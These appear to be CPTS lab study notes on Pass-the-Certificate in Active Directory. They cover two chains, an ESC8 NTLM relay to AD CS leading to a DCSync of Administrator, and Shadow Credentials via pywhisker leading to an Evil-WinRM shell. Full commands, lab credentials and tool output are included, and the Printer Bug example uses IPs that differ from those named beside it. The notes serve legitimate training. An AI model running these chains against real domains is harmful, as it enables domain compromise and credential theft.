# 🔐 1. Pass the Certificate

> [!info]  
> **Pass-the-Certificate (PtC)** is a Kerberos authentication technique that abuses **X.509 certificates** to obtain a **Kerberos Ticket Granting Ticket (TGT)**.
> 
> It is primarily encountered with:
> 
> - **Active Directory Certificate Services (AD CS)** attacks
>     
> - **Shadow Credentials**
>     
> - **PKINIT** authentication
>     

---

# 🧠 2. PKINIT — The Foundation

**PKINIT** stands for:

> **Public Key Cryptography for Initial Authentication**

It is an extension to **Kerberos** that allows **public-key cryptography** to be used during the initial authentication exchange.

Normally:

```text
User
  │
  │ Username + password / Kerberos pre-auth
  ▼
KDC
  │
  │ TGT
  ▼
User
```

With PKINIT:

```text
User
  │
  │ X.509 certificate + private key
  ▼
KDC
  │
  │ Validates certificate
  ▼
TGT
```

This is commonly associated with **smart-card authentication**, where the smart card stores the user's private key.

### 🎯 Why attackers care

If an attacker obtains a certificate that can authenticate as another AD identity, they may be able to use that certificate to request a **TGT for that identity**.

That gives us:

```text
X.509 Certificate
       ↓
     PKINIT
       ↓
      TGT
       ↓
Pass-the-Ticket
       ↓
Authenticate as victim
```

> [!important]  
> **Pass-the-Certificate is not simply "logging in with a certificate."**
> 
> The important attack primitive is:
> 
> **Certificate → PKINIT → TGT → Kerberos authentication**

---

# 🧬 3. Where Pass-the-Certificate Fits

Pass-the-Certificate is especially important when working with:

### 🏢 AD CS

Misconfigurations or vulnerabilities in **Active Directory Certificate Services** can allow an attacker to obtain certificates for privileged identities.

### 👻 Shadow Credentials

An attacker who can modify another account's:

```text
msDS-KeyCredentialLink
```

attribute can add their own public key and subsequently authenticate as that account using PKINIT.

---

# 🎯 4. AD CS NTLM Relay — ESC8

## 🔥 What is ESC8?

**ESC8** is an **NTLM relay attack against an AD CS HTTP enrollment endpoint**.

AD CS can provide certificate enrollment through **web enrollment**.

A typical web enrollment endpoint is:

```text
http://<CA>/CertSrv
```

The important idea is:

```text
Victim authenticates using NTLM
          ↓
      Attacker
          ↓
    NTLM relay
          ↓
 AD CS Web Enrollment
          ↓
 Certificate issued
          ↓
Pass-the-Certificate
          ↓
       TGT
```

> [!warning]  
> The key weakness is that the attacker does **not** need to know the victim's password.
> 
> They relay the victim's NTLM authentication to the AD CS enrollment service.

---

# 🛠️ 5. Setting Up ntlmrelayx

Impacket's `ntlmrelayx` can listen for inbound authentication and relay it to the AD CS web enrollment endpoint.

```bash
impacket-ntlmrelayx -t http://10.129.234.110/certsrv/certfnsh.asp --adcs -smb2support --template KerberosAuthentication
```

### 🔎 Important options

|Option|Purpose|
|---|---|
|`-t`|Specifies the relay target|
|`--adcs`|Enables AD CS certificate enrollment functionality|
|`-smb2support`|Enables SMB2 support|
|`--template`|Specifies the certificate template to request|

In this example:

```text
Target:
http://10.129.234.110/certsrv/certfnsh.asp

Template:
KerberosAuthentication
```

> [!important]  
> The certificate template may be different depending on the environment.
> 
> The appropriate template can be enumerated using tools such as **Certipy**.

---

# 🖨️ 6. Getting a Victim to Authenticate — Printer Bug

Starting `ntlmrelayx` is not enough. We need a machine or user to authenticate to our attacking machine.

There are two possibilities:

```text
1. Wait for authentication
2. Coerce authentication
```

One coercion technique is the **Printer Bug**.

The Printer Bug abuses the **Print Spooler** service to force a machine account to authenticate to an arbitrary host.

### 📌 Requirement

The target machine must have the:

```text
Print Spooler
```

service running.

---

## 💻 6.1 Triggering the Printer Bug

Example:

```bash
python3 printerbug.py INLANEFREIGHT.LOCAL/wwhite:"package5shores_topher1"@10.129.234.174 10.10.14.214
```

Here:

```text
Target DC:
10.129.234.109

Attacker:
10.10.16.12
```

The objective is:

```text
DC01
 │
 │ Forced authentication
 ▼
Attacker machine
 │
 │ NTLM relay
 ▼
AD CS
```

Example output:

```text
[*] Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Attempting to trigger authentication via rprn RPC at 10.129.234.109
[*] Bind OK
[*] Got handle
RPRN SessionError: code: 0x6ba - RPC_S_SERVER_UNAVAILABLE - The RPC server is unavailable.
[*] Triggered RPC backconnect, this may or may not have worked
```

> [!warning]  
> The `RPC_S_SERVER_UNAVAILABLE` message does not necessarily mean the coercion failed.
> 
> The output itself indicates:
> 
> `Triggered RPC backconnect, this may or may not have worked`
> 
> Therefore, check the attacker's `ntlmrelayx` output for the incoming authentication.

---

# 🔄 7. What Happens During the Relay?

When the target machine authenticates, `ntlmrelayx` receives the authentication.

Relevant output:

```text
[*] Servers started, waiting for connections
[*] SMBD-Thread-5 (process_request_thread): Received connection from 10.129.234.109, attacking target http://10.129.234.110
[*] HTTP server returned error code 404, treating as a successful login
[*] Authenticating against http://10.129.234.110 as INLANEFREIGHT/DC01$ SUCCEED
```

The important event is:

```text
DC01$
   ↓
NTLM authentication
   ↓
ntlmrelayx
   ↓
AD CS
   ↓
Authentication succeeds
```

Then `ntlmrelayx` requests a certificate:

```text
[*] Generating CSR...
[*] CSR generated!
[*] Getting certificate...
[*] GOT CERTIFICATE! ID 8
[*] Writing PKCS#12 certificate to ./DC01$.pfx
[*] Certificate successfully written to file
```

The result is:

```text
DC01$.pfx
```

---

# 📦 8. Understanding the PFX Certificate

The resulting:

```text
DC01$.pfx
```

is a **PKCS#12** file.

It can contain:

- X.509 certificate
    
- Private key
    

This is extremely valuable because the certificate + private key can be used for PKINIT.

Mental model:

```text
NTLM Relay
     ↓
Certificate Enrollment
     ↓
DC01$.pfx
     ↓
Certificate + Private Key
     ↓
PKINIT
     ↓
DC01$ TGT
```

---

# 🎟️ 9. Certificate → TGT with gettgtpkinit.py

We can use **PKINITtools** and specifically:

```text
gettgtpkinit.py
```

to use the certificate for Kerberos PKINIT authentication.

---

## 📥 9.1 Clone PKINITtools

```bash
git clone https://github.com/dirkjanm/PKINITtools.git && cd PKINITtools
```

Create a Python virtual environment:

```bash
python3 -m venv .venv
```

Activate it:

```bash
source .venv/bin/activate
```

Install dependencies:

```bash
pip3 install -r requirements.txt
```

---

## ⚠️ 9.2 `libcrypto` Error

If you encounter:

```text
Error detecting the version of libcrypto
```

the source recommends installing `oscrypto` directly from Git:

```bash
pip3 install -I git+https://github.com/wbond/oscrypto.git
```

Example successful output:

```text
Successfully built oscrypto
Installing collected packages: asn1crypto, oscrypto
Successfully installed asn1crypto-1.5.1 oscrypto-1.3.0
```

---

# 🎟️ 10. Requesting the DC01$ TGT

Use the certificate to request a TGT:

```bash
python3 gettgtpkinit.py -cert-pfx ../krbrelayx/DC01\$.pfx -dc-ip 10.129.234.109 'inlanefreight.local/dc01$' /tmp/dc.ccache
```

### 🧠 Break it down

```text
-cert-pfx
    ↓
Certificate + private key

-dc-ip
    ↓
Domain Controller IP

'inlanefreight.local/dc01$'
    ↓
Principal being authenticated as

/tmp/dc.ccache
    ↓
Where the obtained TGT is stored
```

Successful output includes:

```text
[*] Loading certificate and key from file
[*] Requesting TGT
[*] AS-REP encryption key (you might need this later):
[*] 3a1d192a28a4e70e02ae4f1d57bad4adbc7c0b3e7dceb59dab90b8a54f39d616
[*] Saved TGT to file
```

The important result is:

```text
/tmp/dc.ccache
```

We now possess a Kerberos credential cache containing a TGT for:

```text
DC01$
```

---

# 🔥 11. From Pass-the-Certificate → Pass-the-Ticket

At this point, the certificate attack has achieved its goal.

We have:

```text
DC01$.pfx
     ↓
gettgtpkinit.py
     ↓
/tmp/dc.ccache
     ↓
DC01$ TGT
```

From here, the attack becomes a familiar **Pass-the-Ticket** workflow.

Set the Kerberos credential cache:

```bash
export KRB5CCNAME=/tmp/dc.ccache
```

Now tools supporting Kerberos can use the ticket.

---

# 💀 12. DCSync Using the DC01$ TGT

Because the compromised identity is the **domain controller machine account**, it can potentially perform powerful domain operations.

The example uses:

```bash
impacket-secretsdump -k -no-pass -dc-ip 10.129.234.109 -just-dc-user Administrator 'INLANEFREIGHT.LOCAL/DC01$'@DC01.INLANEFREIGHT.LOCAL
```

### 🔎 Important options

|Option|Meaning|
|---|---|
|`-k`|Use Kerberos authentication|
|`-no-pass`|Do not prompt for a password|
|`-dc-ip`|Specify the Domain Controller IP|
|`-just-dc-user Administrator`|Retrieve only the specified user's domain credentials|

The attack uses the **DRSUAPI** method:

```text
DC01$ TGT
    ↓
Kerberos authentication
    ↓
DCSync
    ↓
DRSUAPI
    ↓
NTDS.DIT secrets
    ↓
Administrator NTLM hash
```

Example output:

```text
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404ee4aad3b435b51404ee:...SNIP...:::
```

> [!important]  
> The critical chain to remember is:
> 
> **ESC8 → NTLM Relay → DC certificate → PKINIT → DC01$ TGT → DCSync → Domain credentials**

---

# 👻 13. Shadow Credentials

## 🧠 What Are Shadow Credentials?

**Shadow Credentials** abuse the Active Directory attribute:

```text
msDS-KeyCredentialLink
```

This attribute stores public keys that can be used for authentication through **PKINIT**.

The attack works when an attacker has permission to modify this attribute on another account.

---

# 🔑 14. BloodHound — AddKeyCredentialLink

BloodHound represents the relevant relationship as:

```text
AddKeyCredentialLink
```

Conceptually:

```text
Attacker
   │
   │ Write permission
   ▼
Victim's msDS-KeyCredentialLink
   │
   │ Add attacker's public key
   ▼
Victim account
   │
   │ PKINIT
   ▼
Victim TGT
```

> [!important]  
> The key prerequisite is **write access to the victim's `msDS-KeyCredentialLink` attribute**.

---

# 🛠️ 15. Shadow Credentials with pywhisker

The source demonstrates using:

```text
pywhisker
```

from Linux.

Example:

```bash
pywhisker --dc-ip 10.129.234.109 -d INLANEFREIGHT.LOCAL -u wwhite -p 'package5shores_topher1' --target jpinkman --action add
```

### 🎯 What this performs

The command:

1. Searches for the target account.
    
2. Generates an X.509 certificate.
    
3. Generates a KeyCredential.
    
4. Adds the public key to the victim's `msDS-KeyCredentialLink`.
    
5. Converts the certificate/key into a PFX file.
    

Output:

```text
[*] Searching for the target account
[*] Target user found: CN=Jesse Pinkman,CN=Users,DC=inlanefreight,DC=local
[*] Generating certificate
[*] Certificate generated
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID: 3496da7f-ab0d-13e0-1273-5abca66f901d
[*] Updating the msDS-KeyCredentialLink attribute of jpinkman
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[*] Converting PEM -> PFX with cryptography: eFUVVTPf.pfx
[+] PFX exportiert nach: eFUVVTPf.pfx
[i] Passwort für PFX: bmRH4LK7UwPrAOfvIx6W
[+] Saved PFX (#PKCS12) certificate & key at path: eFUVVTPf.pfx
[*] Must be used with password: bmRH4LK7UwPrAOfvIx6W
[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
```

The resulting file is:

```text
eFUVVTPf.pfx
```

and the PFX password is displayed by the tool.

---

# 🎟️ 16. Obtain the Victim's TGT

Use the generated PFX with `gettgtpkinit.py`:

```bash
python3 gettgtpkinit.py -cert-pfx ../eFUVVTPf.pfx -pfx-pass 'bmRH4LK7UwPrAOfvIx6W' -dc-ip 10.129.234.109 INLANEFREIGHT.LOCAL/jpinkman /tmp/jpinkman.ccache
```

The important transformation is:

```text
Attacker controls
msDS-KeyCredentialLink
        ↓
Generate certificate
        ↓
Store public key on victim
        ↓
PFX + private key
        ↓
PKINIT
        ↓
Victim's TGT
```

Successful output:

```text
[*] Loading certificate and key from file
[*] Requesting TGT
[*] AS-REP encryption key (you might need this later):
[*] f4fa8808fb476e6f982318494f75e002f8ee01c64199b3ad7419f927736ffdb8
[*] Saved TGT to file
```

The resulting cache is:

```text
/tmp/jpinkman.ccache
```

---

# 🎫 17. Use the Victim's TGT

Set the cache:

```bash
export KRB5CCNAME=/tmp/jpinkman.ccache
```

Verify it:

```bash
klist
```

Output:

```text
Ticket cache: FILE:/tmp/jpinkman.ccache
Default principal: jpinkman@INLANEFREIGHT.LOCAL

Valid starting       Expires              Service principal
04/28/2025 20:50:04  04/29/2025 06:50:04  krbtgt/INLANEFREIGHT.LOCAL@INLANEFREIGHT.LOCAL
```

### 🔎 What this tells us

The important line is:

```text
Default principal: jpinkman@INLANEFREIGHT.LOCAL
```

and:

```text
krbtgt/INLANEFREIGHT.LOCAL@INLANEFREIGHT.LOCAL
```

indicates that the cache contains the **domain TGT**.

---

# 🖥️ 18. Using the TGT with Evil-WinRM

In the example, `jpinkman` belongs to:

```text
Remote Management Users
```

This permits remote management access through **WinRM**.

With the Kerberos cache configured and `krb5.conf` properly configured:

```bash
evil-winrm -i dc01.inlanefreight.local -r inlanefreight.local
```

Successful connection:

```text
Evil-WinRM shell v3.7

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\jpinkman\Documents> whoami
inlanefreight\jpinkman
```

Mental model:

```text
Shadow Credential
      ↓
Victim Certificate
      ↓
PKINIT
      ↓
Victim TGT
      ↓
KRB5CCNAME
      ↓
Evil-WinRM
      ↓
Remote Access as Victim
```

---

# 🚫 19. What If PKINIT Is Not Supported?

Sometimes an attacker can obtain a certificate but cannot use it for PKINIT authentication as the desired identity.

For example:

```text
Certificate obtained
       ↓
Attempt PKINIT
       ↓
KDC does not support appropriate EKU
       ↓
PKINIT authentication fails
```

In such situations, the source introduces:

```text
PassTheCert
```

This tool can authenticate against **LDAPS using a certificate** and perform various attacks.

Examples mentioned include:

- Changing passwords
    
- Granting DCSync rights
    

> [!warning]  
> This is a separate attack path from the PKINIT workflow and is outside the scope of this module section.

---

# 🧠 20. The Two Main Pass-the-Certificate Paths

|Attack Path|Starting Point|Certificate Obtained Through|Result|
|---|---|---|---|
|**ESC8**|NTLM relay|AD CS Web Enrollment|Certificate for target machine/account|
|**Shadow Credentials**|Write access to `msDS-KeyCredentialLink`|pywhisker-generated certificate|Certificate for target account|

Both can converge here:

```text
                    ┌──────────────────────┐
                    │ Certificate obtained │
                    └──────────┬───────────┘
                               │
                               ▼
                           PKINIT
                               │
                               ▼
                        ┌─────────────┐
                        │     TGT     │
                        └──────┬──────┘
                               │
                               ▼
                       Pass-the-Ticket
                               │
                    ┌──────────┴──────────┐
                    ▼                     ▼
              Remote Access          DCSync /
              / WinRM                AD attacks
```

---

# 🔥 21. ESC8 vs Shadow Credentials

|Feature|ESC8|Shadow Credentials|
|---|---|---|
|Main weakness|NTLM relay to AD CS|Write access to `msDS-KeyCredentialLink`|
|AD CS required|Yes|Not necessarily|
|NTLM relay required|Yes|No|
|Certificate generated by|AD CS|Attacker/tool|
|Main tool|`ntlmrelayx`|`pywhisker`|
|PKINIT used|Yes|Yes|
|TGT obtained|Yes|Yes|
|Common target|Machine/account|User/account|
|BloodHound relevance|AD CS attack paths|`AddKeyCredentialLink`|

---

# 🧠 22. The Big Mental Model

## 🔴 ESC8

```text
          COERCE
            │
            ▼
       DC01 authenticates
            │
            │ NTLM
            ▼
      ┌─────────────┐
      │ ntlmrelayx  │
      └──────┬──────┘
             │
             │ Relay
             ▼
       AD CS /CertSrv
             │
             │ Certificate
             ▼
          DC01$.pfx
             │
             │ PKINIT
             ▼
         DC01$ TGT
             │
             ▼
         DCSync / PtT
```

## 👻 Shadow Credentials

```text
      Write permission
             │
             ▼
msDS-KeyCredentialLink
             │
             │ Add public key
             ▼
       Victim account
             │
             │ Certificate + private key
             ▼
           PKINIT
             │
             ▼
        Victim TGT
             │
             ▼
      Pass-the-Ticket
             │
             ▼
       Remote access
```

---

# ⚡ 23. CPTS Cheat Sheet

### 🔐 PKINIT

```text
Public-key cryptography
        ↓
Initial Kerberos authentication
        ↓
Certificate
        ↓
TGT
```

### 🔥 ESC8

```text
NTLM Relay
   ↓
AD CS Web Enrollment
   ↓
Certificate
   ↓
gettgtpkinit.py
   ↓
TGT
```

### 👻 Shadow Credentials

```text
Write msDS-KeyCredentialLink
   ↓
pywhisker
   ↓
PFX
   ↓
gettgtpkinit.py
   ↓
TGT
```

### 🎫 Reuse TGT

```bash
export KRB5CCNAME=/tmp/<ticket>.ccache
```

Verify:

```bash
klist
```

### 💀 DCSync

```bash
impacket-secretsdump -k -no-pass -dc-ip <DC-IP> -just-dc-user Administrator '<DOMAIN>/<ACCOUNT>'@<DC-FQDN>
```

### 🖥️ Kerberos WinRM

```bash
evil-winrm -i <DC-FQDN> -r <DOMAIN>
```

---

# 🎯 24. What to Remember for CPTS

> [!success]  
> **The most important concept is the conversion chain:**
> 
> **Certificate → PKINIT → TGT → Pass-the-Ticket**

Remember the two major ways you may obtain the certificate:

```text
ESC8
NTLM Relay → AD CS → Certificate
```

and:

```text
Shadow Credentials
Write msDS-KeyCredentialLink → Certificate
```

Then:

```text
Certificate
    ↓
gettgtpkinit.py
    ↓
.ccache
    ↓
KRB5CCNAME
    ↓
Kerberos authentication
```

### 🧠 One-line memory hook

> **“Get a certificate, turn it into a TGT, then treat the TGT like any other Kerberos ticket.”**

> [!important]  
> Once `gettgtpkinit.py` gives you a `.ccache`, **you are effectively back in Pass-the-Ticket territory**. The certificate was the mechanism used to obtain the Kerberos TGT; the TGT is what you subsequently use for Kerberos authentication and lateral movement.